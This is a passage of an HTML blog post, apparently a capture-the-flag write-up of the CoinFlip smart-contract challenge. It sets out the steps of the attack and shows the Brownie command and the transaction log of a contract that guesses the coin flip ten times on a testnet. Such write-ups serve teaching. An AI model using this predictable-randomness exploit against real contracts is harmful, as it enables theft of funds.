+</span></span><span style="display:flex;"><span>    attack(target, hacker)
+</span></span></code></pre></div><p>The attack vector is straightforward and can be summarized in few steps:</p>
+<ol>
+<li>We will start deploying our malicious contract, by passing the original CoinFlip contract’s address (<code>target</code>) and our wallet address within the <code>from</code> field, which is used to specify the Account to deploy the contract form.</li>
+<li>We use the <code>at</code> method (as defined in the <a href="https://github.com/eth-brownie/brownie/blob/master/docs/core-accounts.rst"  target="_blank" rel="noopener" >core-account.rst</a> documentation) to create an object from an arbitrary address. Useful later to obtain the number of <code>consecutiveWins</code>.</li>
+<li>Last, our attack is executed ten times through the <code>deploy_attack.attack</code> call, which will call the <code>hack</code> method defined in the <code>coinflipattack.sol</code> contract.</li>
+<li>Once our attack has guessed ten times the coin’s flip, we will proceed to destroy our contract and submit the instance, successfully passing this challenge.</li>
+</ol>
+<p>To execute this attack, just run the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>root<span style="color:#a6e22e">@vmi828562</span> <span style="color:#f92672">~/</span>r<span style="color:#f92672">/</span>e<span style="color:#f92672">/</span>coinflip<span style="color:#f92672">-</span><span style="color:#ae81ff">03</span> [<span style="color:#ae81ff">1</span>]<span style="color:#75715e"># brownie run attack main &#34;0x9c654f6E399F3b39415DcA321A0b50921C31917d&#34; --network rinkeby</span>
+</span></span><span style="display:flex;"><span>Brownie v1<span style="color:#ae81ff">.18.1</span> <span style="color:#f92672">-</span> Python development framework <span style="color:#66d9ef">for</span> Ethereum
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Coinflip03Project <span style="color:#f92672">is</span> the active project<span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Running <span style="color:#e6db74">&#39;scripts/attack.py::main&#39;</span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>Transaction sent: <span style="color:#ae81ff">0x237057edd9d989fc3318ab0d82d05fd51748154d97c8c6ecd4ca2d06522ba8c9</span>
+</span></span><span style="display:flex;"><span>  Gas price: <span style="color:#ae81ff">1.16223081</span> gwei   Gas limit: <span style="color:#ae81ff">235118</span>   Nonce: <span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span>  CoinFlipAttack<span style="color:#f92672">.</span>constructor confirmed   Block: <span style="color:#ae81ff">10723036</span>   Gas used: <span style="color:#ae81ff">213744</span> (<span style="color:#ae81ff">90.91</span><span style="color:#f92672">%</span>)
+</span></span><span style="display:flex;"><span>  CoinFlipAttack deployed at: <span style="color:#ae81ff">0x30AFa4bA16e2946ac1063d8c86f986B0E98a2E38</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Address originating the attack:  <span style="color:#ae81ff">0x30AFa4bA16e2946ac1063d8c86f986B0E98a2E38</span>
+</span></span><span style="display:flex;"><span>Transaction sent: <span style="color:#ae81ff">0x54464cdd860d9b2fd3577d530cfc5a74cac61d34369a18cbc1fe4b62942672fb</span>
+</span></span><span style="display:flex;"><span>  Gas price: <span style="color:#ae81ff">1.16223081</span> gwei   Gas limit: <span style="color:#ae81ff">250000</span>   Nonce: <span style="color:#ae81ff">45</span>
+</span></span><span style="display:flex;"><span>  CoinFlipAttack<span style="color:#f92672">.</span>attack confirmed   Block: <span style="color:#ae81ff">10723037</span>   Gas used: <span style="color:#ae81ff">41712</span> (<span style="color:#ae81ff">16.68</span><span style="color:#f92672">%</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Transaction sent: <span style="color:#ae81ff">0x9ef82da3aa6760651b625ac94bb69bce4284204834346a830158a80733e6a626</span>
+</span></span><span style="display:flex;"><span>  Gas price: <span style="color:#ae81ff">1.16223081</span> gwei   Gas limit: <span style="color:#ae81ff">250000</span>   Nonce: <span style="color:#ae81ff">46</span>
+</span></span><span style="display:flex;"><span>  CoinFlipAttack<span style="color:#f92672">.</span>attack confirmed   Block: <span style="color:#ae81ff">10723038</span>   Gas used: <span style="color:#ae81ff">41732</span> (<span style="color:#ae81ff">16.69</span><span style="color:#f92672">%</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Transaction sent: <span style="color:#ae81ff">0xca68cbe9d0eb04898f5c6e6dbdaa78a9deb6ef197d863762340fcedce17196ca</span>
+</span></span><span style="display:flex;"><span>  Gas price: <span style="color:#ae81ff">1.16223081</span> gwei   Gas limit: <span style="color:#ae81ff">250000</span>   Nonce: <span style="color:#ae81ff">47</span>
+</span></span><span style="display:flex;"><span>  CoinFlipAttack<span style="color:#f92672">.</span>attack confirmed   Block: <span style="color:#ae81ff">10723039</span>   Gas used: <span style="color:#ae81ff">41712</span> (<span style="color:#ae81ff">16.68</span><span style="color:#f92672">%</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Transaction sent: <span style="color:#ae81ff">0x1a38621634659e8069b90f1361be1d140927475174ce8809f3d7e6929c02f287</span>
+</span></span><span style="display:flex;"><span>  Gas price: <span style="color:#ae81ff">1.16223081</span> gwei   Gas limit: <span style="color:#ae81ff">250000</span>   Nonce: <span style="color:#ae81ff">48</span>
+</span></span><span style="display:flex;"><span>  CoinFlipAttack<span style="color:#f92672">.</span>attack confirmed   Block: <span style="color:#ae81ff">10723040</span>   Gas used: <span style="color:#ae81ff">41712</span> (<span style="color:#ae81ff">16.68</span><span style="color:#f92672">%</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Transaction sent: <span style="color:#ae81ff">0xfaac369cce1c7464e9c1604301be838914788d1c5e301feee29a6505ec2c9ece</span>
+</span></span><span style="display:flex;"><span>  Gas price: <span style="color:#ae81ff">1.16223081</span> gwei   Gas limit: <span style="color:#ae81ff">250000</span>   Nonce: <span style="color:#ae81ff">49</span>
+</span></span><span style="display:flex;"><span>  CoinFlipAttack<span style="color:#f92672">.</span>attack confirmed   Block: <span style="color:#ae81ff">10723041</span>   Gas used: <span style="color:#ae81ff">41732</span> (<span style="color:#ae81ff">16.69</span><span style="color:#f92672">%</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Transaction sent: <span style="color:#ae81ff">0xb19810a5c590ffc470528a20e618e475ec5b45ce099e14e728b63464fd2ad2fa</span>
+</span></span><span style="display:flex;"><span>  Gas price: <span style="color:#ae81ff">1.16223081</span> gwei   Gas limit: <span style="color:#ae81ff">250000</span>   Nonce: <span style="color:#ae81ff">50</span>
+</span></span><span style="display:flex;"><span>  CoinFlipAttack<span style="color:#f92672">.</span>attack confirmed   Block: <span style="color:#ae81ff">10723042</span>   Gas used: <span style="color:#ae81ff">41712</span> (<span style="color:#ae81ff">16.68</span><span style="color:#f92672">%</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Transaction sent: <span style="color:#ae81ff">0xbff2dceb8092093d02c937f0e5ca4f17443db4715502c688cbc1ff32c95bf270</span>
+</span></span><span style="display:flex;"><span>  Gas price: <span style="color:#ae81ff">1.16223081</span> gwei   Gas limit: <span style="color:#ae81ff">250000</span>   Nonce: <span style="color:#ae81ff">51</span>
+</span></span><span style="display:flex;"><span>  CoinFlipAttack<span style="color:#f92672">.</span>attack confirmed   Block: <span style="color:#ae81ff">10723043</span>   Gas used: <span style="color:#ae81ff">41712</span> (<span style="color:#ae81ff">16.68</span><span style="color:#f92672">%</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Transaction sent: <span style="color:#ae81ff">0xc5169fd82123c87be97647c9ffec276dc9ad358ac07ff7cccfcf170174f22f08</span>
+</span></span><span style="display:flex;"><span>  Gas price: <span style="color:#ae81ff">1.162230809</span> gwei   Gas limit: <span style="color:#ae81ff">250000</span>   Nonce: <span style="color:#ae81ff">52</span>
+</span></span><span style="display:flex;"><span>  CoinFlipAttack<span style="color:#f92672">.</span>attack confirmed   Block: <span style="color:#ae81ff">10723044</span>   Gas used: <span style="color:#ae81ff">41732</span> (<span style="color:#ae81ff">16.69</span><span style="color:#f92672">%</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Transaction sent: <span style="color:#ae81ff">0xc0d29cbb0ba6325e72ae0ea2e3f1151d06b1824ccc200b1b1b8851bd02561d40</span>
+</span></span><span style="display:flex;"><span>  Gas price: <span style="color:#ae81ff">1.162230809</span> gwei   Gas limit: <span style="color:#ae81ff">250000</span>   Nonce: <span style="color:#ae81ff">53</span>
+</span></span><span style="display:flex;"><span>  CoinFlipAttack<span style="color:#f92672">.</span>attack confirmed   Block: <span style="color:#ae81ff">10723045</span>   Gas used: <span style="color:#ae81ff">41712</span> (<span style="color:#ae81ff">16.68</span><span style="color:#f92672">%</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Transaction sent: <span style="color:#ae81ff">0x946840838971c60d46bfaa8757b34db4bb4701830bd38bf0d56a958c1650bec9</span>
+</span></span><span style="display:flex;"><span>  Gas price: <span style="color:#ae81ff">1.162230809</span> gwei   Gas limit: <span style="color:#ae81ff">250000</span>   Nonce: <span style="color:#ae81ff">54</span>
+</span></span><span style="display:flex;"><span>  CoinFlipAttack<span style="color:#f92672">.</span>attack confirmed   Block: <span style="color:#ae81ff">10723046</span>   Gas used: <span style="color:#ae81ff">41732</span> (<span style="color:#ae81ff">16.69</span><span style="color:#f92672">%</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Number:  <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>Transaction sent: <span style="color:#ae81ff">0x86c6605cc6f40cece54143ac4fe154421f4a979ef427fda6938b4222295a2956</span>
+</span></span><span style="display:flex;"><span>  Gas price: <span style="color:#ae81ff">1.16223081</span> gwei   Gas limit: <span style="color:#ae81ff">28796</span>   Nonce: <span style="color:#ae81ff">55</span>
+</span></span><span style="display:flex;"><span>  CoinFlipAttack<span style="color:#f92672">.</span>destroy confirmed   Block: <span style="color:#ae81ff">10723047</span>   Gas used: <span style="color:#ae81ff">26179</span> (<span style="color:#ae81ff">90.91</span><span style="color:#f92672">%</span>)
+</span></span></code></pre></div><h2 id="takeaways">TakeAways</h2>
+<p>It is important to remember that our code is publicly accessible once it has been deployed into the blockchain, and therefore, anyone can see our logic. Also, true randomness is near impossible to achieve in native Solidity, and the use of Oracles is highly recommended.</p>
+
+    </article>
+  </div>
+
+</div>
+
+
+  </div>
+<script type="text/javascript" src="/main.js" defer></script>
+
+
+</body>
+
+</html>
